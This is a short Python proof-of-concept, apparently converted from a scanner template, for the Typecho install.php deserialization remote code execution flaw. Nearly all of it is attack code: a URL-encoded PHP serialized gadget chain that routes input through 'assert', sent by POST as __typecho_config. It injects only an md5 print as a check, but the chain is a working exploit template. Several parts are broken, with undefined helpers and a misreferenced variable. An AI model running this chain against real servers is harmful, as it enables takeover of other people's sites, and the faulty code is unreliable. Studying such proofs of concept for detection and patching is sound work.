# -*- coding: utf-8 -*-
# @Time : 2020/11/23 14:38
# @Author : ki9mu
# @File : file.py.py
# @Software: PyCharm

import random
import os
import sys
sys.path.append(os.getcwd())
import request

def generate_random_str(randomlength=16):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz'
    length = len(base_str) - 1
    for i in range(randomlength):
        random_str += base_str[random.randint(0, length)]
    return random_str

class poc_yaml_typecho_rce():
    url = ""
    referer = ""
    random_str = ""
    payload = ""
    def __init__(self,url):
        self.url = url

        self.referer = request.url

        self.random_str = generate_random_str(4)

        self.payload = base64(urldecode("a%3A2%3A%7Bs%3A7%3A%22adapter%22%3BO%3A12%3A%22Typecho_Feed%22%3A2%3A%7Bs%3A19%3A%22%00Typecho_Feed%00_type%22%3Bs%3A8%3A%22ATOM+1.0%22%3Bs%3A20%3A%22%00Typecho_Feed%00_items%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A8%3A%22category%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A18%3A%22print%28md5%28%27" + random_str + "%27%29%29%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7Ds%3A6%3A%22author%22%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A18%3A%22print%28md5%28%27" + random_str + "%27%29%29%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7D%7D%7Ds%3A6%3A%22prefix%22%3Bs%3A8%3A%22typecho_%22%3B%7D"))

    def request_1(self):
        method = "POST"
        path = "/install.php?finish"
        headers = {'Referer': '{{referer}}'}
        headers = '''{{'Referer': '{}'}}'''.format(self.referer)
        data = "__typecho_config={{payload}}"
        data = "__typecho_config={}".format(self.payload)
        connection = request.Request(self.url,method,{},headers,path,data)
        responses = connection.request()
        print(responses)
